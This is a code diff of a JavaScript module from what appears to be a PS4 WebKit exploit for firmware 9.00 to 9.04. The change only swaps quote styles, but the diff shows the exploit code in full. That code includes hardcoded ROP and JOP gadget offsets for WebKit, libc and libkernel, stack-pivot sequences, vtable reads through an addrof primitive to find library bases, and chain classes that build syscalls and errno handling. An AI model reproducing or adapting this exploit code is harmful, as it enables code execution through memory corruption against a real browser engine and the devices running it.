@@ -18,14 +18,14 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // 9.00, 9.03, 9.04
 // ROP Chain by @janisslsm
 
-import { mem } from "../../module/mem.mjs";
-import { KB } from "../../module/offset.mjs";
-import { ChainBase } from "../../module/chain.mjs";
-import { BufferView } from "../../module/rw.mjs";
+import { mem } from '../../module/mem.mjs';
+import { KB } from '../../module/offset.mjs';
+import { ChainBase } from '../../module/chain.mjs';
+import { BufferView } from '../../module/rw.mjs';
 
-import { get_view_vector, resolve_import, init_syscall_array } from "../../module/memtools.mjs";
+import { get_view_vector, resolve_import, init_syscall_array } from '../../module/memtools.mjs';
 
-import * as off from "../../module/offset.mjs";
+import * as off from '../../module/offset.mjs';
 
 // WebKit offsets of imported functions
 const offset_wk_stack_chk_fail = 0x178;
@@ -54,7 +54,7 @@ call qword ptr [rax + 0xb8]
 // extra objects between the return address and the rbp that will be pushed by
 // jop2 later. So we pop the return address pushed by jop1.
 //
-// This will make pivoting back easy, just "leave; ret".
+// This will make pivoting back easy, just 'leave; ret'.
 const jop2 = `
 pop rsi
 jmp qword ptr [rax + 0x1c]
@@ -81,7 +81,7 @@ const jop6 = `
 push rdx
 jmp qword ptr [rax]
 `;
-const jop7 = "pop rsp; ret";
+const jop7 = 'pop rsp; ret';
 
 // the ps4 firmware is compiled to use rbp as a frame pointer
 //
@@ -98,33 +98,33 @@ const jop7 = "pop rsp; ret";
 
 const webkit_gadget_offsets = new Map(
   Object.entries({
-    "pop rax; ret": 0x0000000000051a12, // `58 c3`
-    "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
-    "pop rcx; ret": 0x00000000000657b7, // `59 c3`
-    "pop rdx; ret": 0x000000000000986c, // `5a c3`
+    'pop rax; ret': 0x0000000000051a12, // `58 c3`
+    'pop rbx; ret': 0x00000000000be5d0, // `5b c3`
+    'pop rcx; ret': 0x00000000000657b7, // `59 c3`
+    'pop rdx; ret': 0x000000000000986c, // `5a c3`
 
-    "pop rbp; ret": 0x00000000000000b6, // `5d c3`
-    "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
-    "pop rdi; ret": 0x0000000000319690, // `5f c3`
-    "pop rsp; ret": 0x000000000004e293, // `5c c3`
+    'pop rbp; ret': 0x00000000000000b6, // `5d c3`
+    'pop rsi; ret': 0x000000000001f4d6, // `5e c3`
+    'pop rdi; ret': 0x0000000000319690, // `5f c3`
+    'pop rsp; ret': 0x000000000004e293, // `5c c3`
 
-    "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
-    "pop r9; ret": 0x0000000000422571, // `47 59 c3`
-    "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
-    "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
+    'pop r8; ret': 0x00000000001a7ef1, // `47 58 c3`
+    'pop r9; ret': 0x0000000000422571, // `47 59 c3`
+    'pop r10; ret': 0x0000000000e9e1d1, // `47 5a c3`
+    'pop r11; ret': 0x00000000012b1d51, // `47 5b c3`
 
-    "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
-    "pop r13; ret": 0x00000000001da461, // `47 5d c3`
-    "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
-    "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
+    'pop r12; ret': 0x000000000085ec71, // `47 5c c3`
+    'pop r13; ret': 0x00000000001da461, // `47 5d c3`
+    'pop r14; ret': 0x0000000000685d73, // `47 5e c3`
+    'pop r15; ret': 0x00000000006ab3aa, // `47 5f c3`
 
-    "ret": 0x0000000000000032, // `c3`
-    "leave; ret": 0x000000000008db5b, // `c9 c3`
+    'ret': 0x0000000000000032, // `c3`
+    'leave; ret': 0x000000000008db5b, // `c9 c3`
 
-    "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
-    "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
-    "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
-    "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
+    'mov rax, qword ptr [rax]; ret': 0x00000000000241cc, // `48 8b 00 c3`
+    'mov qword ptr [rdi], rax; ret': 0x000000000000613b, // `48 89 07 c3`
+    'mov dword ptr [rdi], eax; ret': 0x000000000000613c, // `89 07 c3`
+    'mov dword ptr [rax], esi; ret': 0x00000000005c3482, // `89 30 c3`
 
     [jop1]: 0x00000000004e62a4, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
     [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
@@ -139,22 +139,22 @@ const webkit_gadget_offsets = new Map(
 
 const libc_gadget_offsets = new Map(
   Object.entries({
-    "getcontext": 0x24f04,
-    "setcontext": 0x29448,
+    'getcontext': 0x24f04,
+    'setcontext': 0x29448,
   }),
 );
 
 const libkernel_gadget_offsets = new Map(
   Object.entries({
     // returns the location of errno
-    "__error": 0xcb80,
+    '__error': 0xcb80,
   }),
 );
 
 export const gadgets = new Map();
 
 function get_bases() {
-  const textarea = document.createElement("textarea");
+  const textarea = document.createElement('textarea');
   const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
   const textarea_vtable = webcore_textarea.readp(0);
   const off_ta_vt = 0x2e73c18;
@@ -181,30 +181,30 @@ export function init_gadget_map(gadget_map, offset_map, base_addr) {
 
 class Chain900Base extends ChainBase {
   push_end() {
-    this.push_gadget("leave; ret");
+    this.push_gadget('leave; ret');
   }
 
   push_get_retval() {
-    this.push_gadget("pop rdi; ret");
+    this.push_gadget('pop rdi; ret');
     this.push_value(this.retval_addr);
-    this.push_gadget("mov qword ptr [rdi], rax; ret");
+    this.push_gadget('mov qword ptr [rdi], rax; ret');
   }
 
   push_get_errno() {
-    this.push_gadget("pop rdi; ret");
+    this.push_gadget('pop rdi; ret');
     this.push_value(this.errno_addr);
 
-    this.push_call(this.get_gadget("__error"));
+    this.push_call(this.get_gadget('__error'));
 
-    this.push_gadget("mov rax, qword ptr [rax]; ret");
-    this.push_gadget("mov dword ptr [rdi], eax; ret");
+    this.push_gadget('mov rax, qword ptr [rax]; ret');
+    this.push_gadget('mov dword ptr [rdi], eax; ret');
   }
 
   push_clear_errno() {
-    this.push_call(this.get_gadget("__error"));
-    this.push_gadget("pop rsi; ret");
+    this.push_call(this.get_gadget('__error'));
+    this.push_gadget('pop rsi; ret');
     this.push_value(0);
-    this.push_gadget("mov dword ptr [rax], esi; ret");
+    this.push_gadget('mov dword ptr [rax], esi; ret');
   }
 }
 
@@ -212,7 +212,7 @@ export class Chain900 extends Chain900Base {
   constructor() {
     super();
 
-    const textarea = document.createElement("textarea");
+    const textarea = document.createElement('textarea');
     this._textarea = textarea;
     const js_ta = mem.addrof(textarea);
     const webcore_ta = js_ta.readp(0x18);
